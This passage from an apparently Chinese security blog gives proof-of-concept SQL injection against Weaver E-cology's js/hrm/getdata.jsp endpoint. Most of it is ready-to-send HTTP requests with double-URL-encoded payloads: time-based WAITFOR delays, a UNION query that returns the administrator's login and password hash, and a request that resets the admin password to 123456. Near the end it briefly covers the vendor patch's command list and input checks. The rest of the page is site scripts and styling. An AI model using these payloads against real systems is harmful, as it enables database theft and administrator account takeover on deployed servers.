GET /js/hrm/getdata.jsp?cmd=%25%37%36%25%36%35%25%37%32%25%36%39%25%36%36%25%37%39%25%35%30%25%37%33%25%37%37%25%36%34&id=%25%33%31%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%31%25%35%33%25%34%35%25%32%30%25%35%37%25%34%38%25%34%35%25%34%65%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30%25%35%34%25%34%38%25%34%35%25%34%65%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%66%25%35%35%25%34%65%25%35%34%25%32%38%25%32%61%25%32%39%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%31%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%32%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%33%25%32%39%25%32%30%25%34%35%25%34%63%25%35%33%25%34%35%25%32%30%25%33%31%25%32%30%25%34%35%25%34%65%25%34%34%25%32%39%25%32%30%25%33%65%25%32%30%25%33%30%25%32%30&pswd=1 HTTP/1.1
Host: ecology.mrxn.net
```

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/6f14ed9d6bf449aeafb11dcd0d729c9b.webp)

## userOffline

> -1 WAITFOR DELAY'0:0:3'

```
GET /js/hrm/getdata.jsp?cmd=%25%37%35%25%37%33%25%36%35%25%37%32%25%34%66%25%36%36%25%36%36%25%36%63%25%36%39%25%36%65%25%36%35&uid=%25%32%64%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37 HTTP/1.1
Host: ecology.mrxn.net
```

## forgotPasswordCheck

> -1' WAITFOR DELAY'0:0:3

```
GET /js/hrm/getdata.jsp?cmd=%25%36%36%25%36%66%25%37%32%25%36%37%25%36%66%25%37%34%25%35%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%34%33%25%36%38%25%36%35%25%36%33%25%36%62&loginid=%25%32%64%25%33%31%25%32%37%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33 HTTP/1.1
Host: ecology.mrxn.net
```

### 联合注入获取管理员数据

> -1' union Select NULL,loginid,password,lastname,status,6 FROM HrmResourceManager WHERE id='1

```
GET /js/hrm/getdata.jsp?cmd=%25%36%36%25%36%66%25%37%32%25%36%37%25%36%66%25%37%34%25%35%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%34%33%25%36%38%25%36%35%25%36%33%25%36%62&loginid=%25%32%64%25%33%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%35%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%65%25%35%35%25%34%63%25%34%63%25%32%63%25%36%63%25%36%66%25%36%37%25%36%39%25%36%65%25%36%39%25%36%34%25%32%63%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34%25%32%63%25%36%63%25%36%31%25%37%33%25%37%34%25%36%65%25%36%31%25%36%64%25%36%35%25%32%63%25%37%33%25%37%34%25%36%31%25%37%34%25%37%35%25%37%33%25%32%63%25%33%36%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%34%38%25%37%32%25%36%64%25%35%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%37%32%25%32%30%25%35%37%25%34%38%25%34%35%25%35%32%25%34%35%25%32%30%25%36%39%25%36%34%25%33%64%25%32%37%25%33%31 HTTP/1.1
Host: ecology.mrxn.net

HTTP/1.1 200 OK
Server: Resin/3.1.8
X-UA-Compatible:
Cache-Control: no-cache
Set-Cookie: JSESSIONID=abcoykFpJBpKnfIci7gEz; path=/
Content-Type: text/html; charset=UTF-8
Content-Length: 122

[{id:'-1',lastname:'sysadmin',loginid:'C4CA4238A0B923820DCC509A6F75849B',email:'系统管理员',mobile:'1',qCount:'6'}]
```

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/1db1d4bc85024035a3a975d7590a6b66.webp)

## sendSMS

```
GET /js/hrm/getdata.jsp?cmd=sendSMS&id=1&receiver=admin&content=test&loginid=1%27%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%33 HTTP/1.1
Host: ecology.mrxn.net
```

## sendEmail

同sendSMS

## verifyQuestion

> loginid、qid、answer 三个参数均存在SQL注入

```
GET /js/hrm/getdata.jsp?cmd=%25%37%36%25%36%35%25%37%32%25%36%39%25%36%36%25%37%39%25%35%31%25%37%35%25%36%35%25%37%33%25%37%34%25%36%39%25%36%66%25%36%65&id=1&loginid=%25%32%64%25%33%31%25%32%37%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33&qid=123&answer=1 HTTP/1.1
Host: ecology.mrxn.net
```

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/74918e6f195547a086edb4d61a1af183.webp)

## saveNewPassword

```
GET /js/hrm/getdata.jsp?cmd=%25%37%33%25%36%31%25%37%36%25%36%35%25%34%65%25%36%35%25%37%37%25%35%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%66%25%37%32%25%36%34&id=1&newpswd=123&loginid=%25%32%64%25%33%31%25%32%37%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33&qid=123&answer=1 HTTP/1.1
Host: ecology.mrxn.net
```

### 修改管理员密码为 123456

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/7147932e231142f4a632682ff609dcfe.webp)

查看密码

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/8e2f0fa52e96438388ca5c1acd2cc15a.webp)

已被修改为
`123456`
的md5
`E10ADC3949BA59ABBE56E057F20F883E`
了

## saveAdminUsbSet

> arg0、arg1、arg2、arg3、arg4、arg5均存在SQL注入

```
GET /js/hrm/getdata.jsp?cmd=%25%37%33%25%36%31%25%37%36%25%36%35%25%34%31%25%36%34%25%36%64%25%36%39%25%36%65%25%35%35%25%37%33%25%36%32%25%35%33%25%36%35%25%37%34&arg2=1&arg1=123&arg0=%25%32%64%25%33%31%25%32%30%25%35%37%25%34%31%25%34%39%25%35%34%25%34%36%25%34%66%25%35%32%25%32%30%25%34%34%25%34%35%25%34%63%25%34%31%25%35%39%25%32%37%25%33%30%25%33%61%25%33%30%25%33%61%25%33%33%25%32%37&qid=123&answer=1 HTTP/1.1
Host: ecology.mrxn.net
```

## savect

> 使用笛卡尔乘积测试延时差

```
GET /js/hrm/getdata.jsp?cmd=%25%37%33%25%36%31%25%37%36%25%36%35%25%36%33%25%37%34&arg2=1&arg1=123&arg0=%25%33%31%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%31%25%35%33%25%34%35%25%32%30%25%35%37%25%34%38%25%34%35%25%34%65%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30%25%35%34%25%34%38%25%34%35%25%34%65%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%66%25%35%35%25%34%65%25%35%34%25%32%38%25%32%61%25%32%39%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%31%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%32%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%33%25%32%39%25%32%30%25%34%35%25%34%63%25%35%33%25%34%35%25%32%30%25%33%31%25%32%30%25%34%35%25%34%65%25%34%34%25%32%39%25%32%30%25%33%65%25%32%30%25%33%30%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30&qid=123&answer=1 HTTP/1.1
Host: ecology.mrxn.net
```

## initChart

```
GET /js/hrm/getdata.jsp?cmd=initChart&arg0=%25%33%31%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%31%25%35%33%25%34%35%25%32%30%25%35%37%25%34%38%25%34%35%25%34%65%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30%25%35%34%25%34%38%25%34%35%25%34%65%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%66%25%35%35%25%34%65%25%35%34%25%32%38%25%32%61%25%32%39%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%31%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%32%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%33%25%32%39%25%32%30%25%34%35%25%34%63%25%35%33%25%34%35%25%32%30%25%33%31%25%32%30%25%34%35%25%34%65%25%34%34%25%32%39%25%32%30%25%33%65%25%32%30%25%33%30%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30 HTTP/1.1
Host: ecology.mrxn.net
```

## checkBeforeShowMobileSignData

```
GET /js/hrm/getdata.jsp?cmd=%25%36%33%25%36%38%25%36%35%25%36%33%25%36%62%25%34%32%25%36%35%25%36%36%25%36%66%25%37%32%25%36%35%25%35%33%25%36%38%25%36%66%25%37%37%25%34%64%25%36%66%25%36%32%25%36%39%25%36%63%25%36%35%25%35%33%25%36%39%25%36%37%25%36%65%25%34%34%25%36%31%25%37%34%25%36%31&arg=%25%33%31%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%31%25%35%33%25%34%35%25%32%30%25%35%37%25%34%38%25%34%35%25%34%65%25%32%30%25%33%31%25%33%64%25%33%31%25%32%30%25%35%34%25%34%38%25%34%35%25%34%65%25%32%30%25%32%38%25%35%33%25%34%35%25%34%63%25%34%35%25%34%33%25%35%34%25%32%30%25%34%33%25%34%66%25%35%35%25%34%65%25%35%34%25%32%38%25%32%61%25%32%39%25%32%30%25%34%36%25%35%32%25%34%66%25%34%64%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%31%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%32%25%32%63%25%32%30%25%37%33%25%37%39%25%37%33%25%32%65%25%36%31%25%36%63%25%36%63%25%35%66%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%37%33%25%32%30%25%36%33%25%32%39%25%32%30%25%34%35%25%34%63%25%35%33%25%34%35%25%32%30%25%33%31%25%32%30%25%34%35%25%34%65%25%34%34%25%32%39%25%32%30%25%33%65%25%32%30%25%33%30&qid=123&answer=1 HTTP/1.1
Host: ecology.mrxn.net
```

# 其他

根据本次
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
的补丁

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/fd33fc06218a4ceca3e07353975d00df.webp)

检测只需要把cmd参数里unCheckCmd4E8列表进行检测即可

0616补丁 unCheckCmd4E8 列表

```
checkValidatecode,verifyPswd,verifyQuestion,forgotPasswordCheckMsg,forgotPasswordCheck,saveNewPassword,sendEmail,sendEmailCode,sendSMSCode,sendSMS,checkEmailCode,checkSMSCode,checkValicateCode
```

同时还校验了cmd 不能包含单引号、百分号、或者空、null

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/7040d905371d48acbedaec3b221ac1c0.webp)

同时对参数也都有校验，还有RASP防护

![泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://image.mrxn.net/18c898a0ad05419fb9dacf4ed14533d6.webp)

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[泛微E-cology js/hrm/getdata.jsp SQL注入漏洞](https://mrxn.net/jswz/fanwei-ecology-getdata-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/fanwei-ecology-getdata-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fanwei-ecology-getdata-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/fanwei-ecology-getdata-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});